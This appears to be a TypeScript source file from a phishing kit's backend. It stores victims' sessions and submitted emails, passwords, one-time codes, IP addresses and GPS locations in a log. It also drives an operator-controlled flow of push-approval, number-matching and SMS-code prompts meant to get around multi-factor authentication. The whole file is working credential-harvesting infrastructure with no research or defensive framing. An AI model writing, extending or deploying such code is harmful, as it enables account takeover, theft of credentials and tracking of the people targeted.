import { randomBytes, randomInt, randomUUID } from "crypto";
import fs from "fs";
import path from "path";
import { auto2faSimulation, getDataDir } from "./env";
import {
  isRedisStore,
  loadCallbacksRaw,
  loadSessionsRaw,
  redisGetSession,
  redisGetSessionIdForCallback,
  redisLinkCallback,
  redisSetSession,
  saveCallbacksRaw,
  saveSessionsRaw,
} from "./persistence";

export type SessionRecord = {
  id: string;
  decision: string | null;
  consented: boolean;
  email?: string;
  provider?: string;
  passwordAttempts: number;
  flowStartedAt?: number;
  promptNumber?: string;
  callbackKey?: string;
  ip?: string;
  userAgent?: string;
  location?: string;
  ipLat?: number;
  ipLon?: number;
  gpsLat?: number;
  gpsLon?: number;
  lastSubmittedPassword?: string;
  createdAt: string;
  updatedAt: string;
};

export type SubmissionRecord = {
  id: string;
  sessionId: string;
  type: "credentials" | "otp" | "code" | "notify" | "email-typing";
  provider: string;
  email?: string;
  password?: string;
  otp?: string;
  code?: string;
  ip?: string;
  timestamp: string;
};

function defaultSessionFields(now: string): Pick<
  SessionRecord,
  "decision" | "consented" | "passwordAttempts" | "createdAt"
> {
  return {
    decision: null,
    consented: false,
    passwordAttempts: 0,
    createdAt: now,
  };
}

function ensureDataDir() {
  const dir = getDataDir();
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
  return dir;
}

function submissionsPath() {
  return path.join(ensureDataDir(), "submissions.jsonl");
}

async function readSessions(): Promise<Record<string, SessionRecord>> {
  const raw = await loadSessionsRaw();
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, SessionRecord>;
  } catch {
    return {};
  }
}

async function writeSessions(sessions: Record<string, SessionRecord>) {
  await saveSessionsRaw(JSON.stringify(sessions, null, 2));
}

export async function getSession(
  sessionId: string,
): Promise<SessionRecord | null> {
  if (isRedisStore()) {
    const raw = await redisGetSession(sessionId);
    return raw ? (raw as SessionRecord) : null;
  }
  const sessions = await readSessions();
  return sessions[sessionId] ?? null;
}

export async function upsertSession(
  sessionId: string,
  patch: Partial<SessionRecord>,
): Promise<SessionRecord> {
  const now = new Date().toISOString();
  const existing = await getSession(sessionId);

  const next: SessionRecord = {
    ...defaultSessionFields(now),
    ...existing,
    ...patch,
    id: sessionId,
    updatedAt: now,
    createdAt: existing?.createdAt ?? now,
  };

  if (isRedisStore()) {
    await redisSetSession(sessionId, next);
    return next;
  }

  const sessions = await readSessions();
  sessions[sessionId] = next;
  await writeSessions(sessions);
  return next;
}

export function appendSubmission(
  entry: Omit<SubmissionRecord, "id" | "timestamp">,
) {
  const record: SubmissionRecord = {
    ...entry,
    id: randomUUID(),
    timestamp: new Date().toISOString(),
  };
  try {
    fs.appendFileSync(submissionsPath(), `${JSON.stringify(record)}\n`);
  } catch (error) {
    console.error("Submission log write failed:", error);
  }
  return record;
}

const FLOW_STEPS: { afterMs: number; decision: (s: SessionRecord) => string }[] =
  [
    { afterMs: 2000, decision: () => "yes-prompt" },
    {
      afterMs: 5000,
      decision: (s) =>
        `number-prompt:${s.promptNumber ?? String(randomInt(10, 99))}`,
    },
    { afterMs: 12000, decision: () => "sms-code" },
    { afterMs: 20000, decision: () => "success" },
  ];

export async function resolveDecision(
  session: SessionRecord,
): Promise<string | null> {
  if (!session.flowStartedAt || !auto2faSimulation()) {
    return session.decision;
  }

  const elapsed = Date.now() - session.flowStartedAt;
  let current: string | null = null;

  for (const step of FLOW_STEPS) {
    if (elapsed >= step.afterMs) {
      current = step.decision(session);
    }
  }

  if (current?.startsWith("number-prompt:") && !session.promptNumber) {
    const num = current.split(":")[1];
    await upsertSession(session.id, { promptNumber: num, decision: current });
    return current;
  }

  if (current !== session.decision) {
    await upsertSession(session.id, { decision: current });
  }

  return current;
}

async function readCallbacks(): Promise<Record<string, string>> {
  const raw = await loadCallbacksRaw();
  if (!raw) return {};
  try {
    return JSON.parse(raw) as Record<string, string>;
  } catch {
    return {};
  }
}

async function writeCallbacks(map: Record<string, string>) {
  await saveCallbacksRaw(JSON.stringify(map, null, 2));
}

export async function linkCallbackKey(key: string, sessionId: string) {
  if (isRedisStore()) {
    await redisLinkCallback(key, sessionId);
    return;
  }
  const map = await readCallbacks();
  map[key] = sessionId;
  await writeCallbacks(map);
}

export async function getSessionByCallbackKey(
  key: string,
): Promise<SessionRecord | null> {
  if (isRedisStore()) {
    const sessionId = await redisGetSessionIdForCallback(key);
    if (sessionId) {
      const raw = await redisGetSession(sessionId);
      if (raw) return raw as SessionRecord;
    }
    return null;
  } else {
    const map = await readCallbacks();
    const sessionId = map[key];
    if (sessionId) {
      const session = await getSession(sessionId);
      if (session) return session;
    }
  }

  if (isRedisStore()) return null;

  const sessions = await readSessions();
  return Object.values(sessions).find((s) => s.callbackKey === key) ?? null;
}

export async function ensureCallbackKey(sessionId: string): Promise<string> {
  const session = await getSession(sessionId);
  if (session?.callbackKey) {
    await linkCallbackKey(session.callbackKey, sessionId);
    return session.callbackKey;
  }
  const callbackKey = randomBytes(4).toString("hex");
  await upsertSession(sessionId, { callbackKey });
  await linkCallbackKey(callbackKey, sessionId);
  return callbackKey;
}

export async function setSessionDecision(sessionId: string, decision: string) {
  const patch: Partial<SessionRecord> = {
    decision,
    flowStartedAt: undefined,
  };

  if (decision.startsWith("number-prompt:")) {
    patch.promptNumber = decision.split(":")[1];
  }

  return upsertSession(sessionId, patch);
}

export async function resetOperatorFlow(sessionId: string) {
  return upsertSession(sessionId, {
    promptNumber: undefined,
    decision: null,
    flowStartedAt: undefined,
  });
}

export async function start2faFlow(sessionId: string) {
  return upsertSession(sessionId, {
    flowStartedAt: Date.now(),
    decision: null,
    promptNumber: undefined,
  });
}
